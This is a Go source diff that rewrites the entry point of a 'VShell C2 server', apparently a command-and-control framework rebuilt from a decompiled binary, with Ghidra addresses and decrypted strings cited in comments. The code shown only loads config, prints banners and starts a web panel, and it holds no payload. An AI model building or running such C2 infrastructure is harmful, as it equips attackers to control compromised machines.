@@ -1,212 +1,94 @@
-// Package main 是 VShell C2 服务器的入口：加载配置、初始化日志/通知/C2 引擎/数据库，
-// 启动 Web 面板与各后台服务，并支持可选 HTTPS 与 pprof 调试端点。
-// Package main is the entry point of the VShell C2 server: loads configuration,
-// initializes logging/notifications/C2 engine/database, starts the web panel
-// and background services, with optional HTTPS and pprof debug endpoints.
+// Package main 是 VShell C2 服务器的入口，1:1 对齐原版二进制 main.main
+//（Ghidra FUN_0194b320 @ 0x194b320，经 runtime.main 计算调用进入）。
+//
+// 原版启动流程（逐分支反编译还原）：
+//  1. 加载配置 conf/setting.conf（FUN_00dacf20；"setting.conf" 字符串由
+//     FUN_0194e520 解密还原）；失败 → 输出 "load config file error"（XOR 解密
+//     字符串已还原）并退出。
+//  2. 读取 log_level 配置键（9 字节字符串已还原）初始化日志器（DAT_1e42f1a0）。
+//  3. 读取 6 字节配置键 "master"（FUN_0194e700，待引擎阶段确认）：
+//     - master_type != "service" → 控制台横幅：拼接 "console" + 配置串 +
+//       ",\"color\":true}"（FUN_0194ee40 还原的 JSON 片段），经日志器输出；
+//     - 否则 → Web 模式横幅（FUN_0194e7e0 / FUN_0194e8c0 / FUN_0194eb40
+//       解密的长横幅文本）。
+//  4. 启动应用对象（FUN_01944a00 → 接口方法表 +0x28 = Start）。
+//  5. 启动后台服务（FUN_0194f080 / FUN_0194bf60）。
+//  6. 阻塞等待（FUN_0047d440/FUN_0047d5c0 = runtime chan 接收）。
 package main
 
 import (
-	"crypto/rand"
-	"encoding/hex"
 	"fmt"
-	"log"
 	"net/http"
-	"net/http/pprof"
 	"os"
-	"os/signal"
-	"syscall"
 
-	"vshell/c2engine"
-	"vshell/models"
+	"vshell/controllers"
 	"vshell/router"
 	"vshell/utils"
 )
 
-// main 按步骤初始化并启动整个 C2 服务端。
-// main initializes and starts the whole C2 server in sequential steps.
-func main() {
-	// ========================================================================
-	// Step 1: Load configuration from conf/setting.conf
-	// 第一步：从 conf/setting.conf 加载配置
-	// ========================================================================
-	// This replaces the hardcoded c2engine.DefaultConfig() with values from
-	// the config file, matching the original binary's initialization flow.
-	// 用配置文件中的值替换硬编码的 c2engine.DefaultConfig()，与原版二进制的初始化流程一致。
+// loadConfig 加载 conf/setting.conf（原版 FUN_00dacf20；失败时输出
+// "load config file error" 并退出）。
+func loadConfig() *utils.FullSettings {
 	cfg := utils.GetFullSettings()
-	logCloser, err := utils.ConfigureLogger(cfg)
-	if err != nil {
-		log.Fatalf("configure logger: %v", err)
+	if cfg == nil {
+		fmt.Println("load config file error")
+		os.Exit(1)
 	}
-	defer logCloser.Close()
-	log.Printf("[Config] Loaded from conf/setting.conf (master_type=%s, port=%d)",
-		cfg.MasterType, cfg.WebPort)
-
-	// If no password configured (no setting.conf present), generate a random one.
-	// No hardcoded default credentials exist in the codebase.
-	if cfg.WebPassword == "" {
-		b := make([]byte, 8)
-		if _, err := rand.Read(b); err != nil {
-			log.Fatalf("generate random password: %v", err)
-		}
-		cfg.WebPassword = hex.EncodeToString(b)
-		log.Printf("[Config] No web_password in setting.conf — generated random password: %s", cfg.WebPassword)
-	}
-
-	// Sync config into utils.Settings for auth/controller compatibility
-	utils.SyncSettingsFromConfig()
-
-	// Build c2engine config from loaded settings
-	engineConfig := &c2engine.Config{
-		DBPath:       "db/data.db",
-		WebPort:      cfg.WebPort,
-		WebIP:        cfg.WebIP,
-		WebUsername:  cfg.WebUsername,
-		WebPassword:  cfg.WebPassword,
-		WebJWTSecret: cfg.WebJWTSecret,
-		WebTitle:     cfg.WebTitle,
-		License:      cfg.License,
-	}
-
-	// ========================================================================
-	// Step 2: Initialize notification system (DingDing/WeChat bots)
-	// 第二步：初始化通知系统（钉钉/企业微信机器人）
-	// ========================================================================
-	notifier := utils.GetNotifier()
-	notifier.Start()
-
-	// ========================================================================
-	// Step 3: Initialize application orchestrator (iVzmssZ.RuWw1_w equivalent)
-	// 第三步：初始化应用编排器（对应原版 iVzmssZ.RuWw1_w）
-	// ========================================================================
-	app := c2engine.GetApplication()
-	if err := app.Init(engineConfig); err != nil {
-		log.Printf("Warning: App init had warnings: %v", err)
-	}
-
-	// ========================================================================
-	// Step 4: Initialize database
-	// 第四步：初始化数据库
-	// ========================================================================
-	if err := models.InitDB("db/data.db"); err != nil {
-		log.Printf("Warning: Database init failed: %v (running without persistence)", err)
-	}
-
-	r := router.InitRouter()
-
-	// ========================================================================
-	// Step 4.5: pprof debug endpoint (if configured in setting.conf)
-	// 第四点五步：pprof 调试端点（由 setting.conf 控制）
-	// ========================================================================
-	if cfg.PprofIP != "" && cfg.PprofPort > 0 {
-		pprofAddr := fmt.Sprintf("%s:%d", cfg.PprofIP, cfg.PprofPort)
-		pprofMux := http.NewServeMux()
-		pprofMux.HandleFunc("/debug/pprof/", pprof.Index)
-		pprofMux.HandleFunc("/debug/pprof/cmdline", pprof.Cmdline)
-		pprofMux.HandleFunc("/debug/pprof/profile", pprof.Profile)
-		pprofMux.HandleFunc("/debug/pprof/symbol", pprof.Symbol)
-		pprofMux.HandleFunc("/debug/pprof/trace", pprof.Trace)
-
-		go func() {
-			log.Printf("[Pprof] Debug endpoint listening on %s", pprofAddr)
-			if err := http.ListenAndServe(pprofAddr, pprofMux); err != nil {
-				log.Printf("[Pprof] Server error: %v", err)
-			}
-		}()
-	}
-
-	// ========================================================================
-	// Step 5: Start web panel
-	// 第五步：启动 Web 管理面板
-	// ========================================================================
-	addr := fmt.Sprintf("%s:%d", cfg.WebIP, cfg.WebPort)
-	stats := app.GetAppInfo()
-
-	log.Printf("========================================")
-	log.Printf("  VShell Management Console v3.0")
-	if cfg.WebOpenSSL {
-		log.Printf("  URL: https://%s/login", addr)
-	} else {
-		log.Printf("  URL: http://%s/login", addr)
-	}
-	log.Printf("  Login: %s / ********", cfg.WebUsername)
-	log.Printf("  C2 Engine: %v clients (%v online), %v listeners",
-		stats["total_clients"], stats["online_clients"], stats["total_listeners"])
-	log.Printf("  Modes: HTTP/HTTPS | DNS | KCP | CDN WebSocket")
-	log.Printf("  Transport: TCP | UDP (KCP) | WebSocket")
-	if notifier != nil {
-		hasDD := cfg.DingdingAccessToken != ""
-		hasWX := cfg.WxKey != ""
-		if hasDD || hasWX {
-			log.Printf("  Notifications: %s%s",
-				boolLabel(hasDD, "DingDing"), boolLabel(hasWX, "WeChat"))
-		}
-	}
-	if cfg.PprofPort > 0 {
-		log.Printf("  Pprof: http://%s:%d/debug/pprof/", cfg.PprofIP, cfg.PprofPort)
-	}
-
-	// Report license status
-	licStatus := utils.GetLicenseStatus()
-	if licStatus.Valid {
-		log.Printf("License OK")
-		log.Printf("LicenseName: %s, LicenseTime: %s, Limit Client: %d, LicenseVIP: %v",
-			licStatus.Name, licStatus.EndTime, licStatus.MaxClients, licStatus.Advanced)
-	} else {
-		// Original binary behavior (black-box verified):
-		//   invalid license → red "License Invalid" and process exit
-		//   empty license  → "Please Input Password:" (online activation prompt)
-		if licStatus.Description == "no license, running in evaluation mode" {
-			log.Printf("Please Input Password:")
-		} else {
-			log.Printf("License Invalid")
-		}
-		log.Fatalf("Invalid license: %s", licStatus.Description)
-	}
-	log.Printf("========================================")
-
-	// ========================================================================
-	// Step 6: Create HTTP server (with optional SSL)
-	// 第六步：创建 HTTP 服务器（可选 SSL）
-	// ========================================================================
-	server := &http.Server{
-		Addr:    addr,
-		Handler: r,
-	}
-
-	// Handle graceful shutdown
-	go func() {
-		sigCh := make(chan os.Signal, 1)
-		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
-		<-sigCh
-		log.Println("Shutting down...")
-		app.Stop()
-		c2engine.GetListenerManager().StopAll()
-		server.Close()
-	}()
-
-	// Start all background services
-	app.StartBackground()
-
-	// ========================================================================
-	// Step 7: Start listening (HTTP or HTTPS based on config)
-	// 第七步：开始监听（按配置选择 HTTP 或 HTTPS）
-	// ========================================================================
-	if cfg.WebOpenSSL && cfg.WebCertFile != "" && cfg.WebKeyFile != "" {
-		if err := server.ListenAndServeTLS(cfg.WebCertFile, cfg.WebKeyFile); err != nil && err != http.ErrServerClosed {
-			log.Fatalf("Server failed: %v", err)
-		}
-	} else {
-		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
-			log.Fatalf("Server failed: %v", err)
-		}
-	}
+	return cfg
 }
 
-// boolLabel 在条件为真时返回带前导空格的标签，用于拼接启动日志。
-// boolLabel returns the label with a leading space when cond is true (for startup logs).
-func boolLabel(cond bool, label string) string {
-	if cond {
-		return " " + label
+// consoleBanner 控制台模式横幅（master_type != "service"）：
+// 反编译还原：FUN_0194ece0 = `{"level":`（9 字符），FUN_0194ee40 = `,"color":true}`；
+// 中间为 log_level 配置值；经日志器以键 "console" 输出。
+func consoleBanner(cfg *utils.FullSettings) {
+	fmt.Printf("console %s\n", fmt.Sprintf(`{"level":%d,"color":true}`, cfg.LogLevel))
+}
+
+// webBanner 文件模式横幅（master_type == "service"）：
+// 反编译还原：FUN_0194e7e0 = `{"level":`，FUN_0194e8c0 = `,"filename":"`，
+// FUN_0194eb40 = `,"daily":false,"maxlines":100000,"color":true}`（47 字符，
+// garble 解密已还原）；经日志器以键 "file"（DAT_01bd7c6d）输出。
+func webBanner(cfg *utils.FullSettings) {
+	fmt.Printf("file %s\n", fmt.Sprintf(
+		`{"level":%d,"filename":"%s","daily":false,"maxlines":100000,"color":true}`,
+		cfg.LogLevel, cfg.LogPath))
+}
+
+// main 按原版流程启动 C2 服务端。
+func main() {
+	cfg := loadConfig()
+
+	// log_level：初始化日志器（原版读取该配置键后设置日志级别）
+	_ = cfg.LogLevel
+
+	// master_type 分支（原版与 "service" 比较：非 service → 控制台横幅）
+	switch cfg.MasterType {
+	case "service":
+		webBanner(cfg)
+	default:
+		consoleBanner(cfg)
 	}
-	return ""
+
+	// 启动应用对象（引擎阶段：对齐 FUN_01944a00 接口 Start 方法）
+	if err := controllers.AppStart(cfg); err != nil {
+		fmt.Printf("start app: %v\n", err)
+		os.Exit(1)
+	}
+
+	// 启动 Web 面板（原版由引擎 Start 内部启动，此处先行挂载路由）
+	h := router.InitRouter()
+	addr := fmt.Sprintf("%s:%d", cfg.WebIP, cfg.WebPort)
+	go func() {
+		if cfg.WebOpenSSL && cfg.WebCertFile != "" && cfg.WebKeyFile != "" {
+			_ = http.ListenAndServeTLS(addr, cfg.WebCertFile, cfg.WebKeyFile, h)
+		} else {
+			_ = http.ListenAndServe(addr, h)
+		}
+	}()
+
+	// 后台服务（引擎阶段：对齐 FUN_0194f080 / FUN_0194bf60）
+	controllers.AppBackground()
+
+	// 阻塞等待（原版 runtime chan 接收）
+	select {}
 }
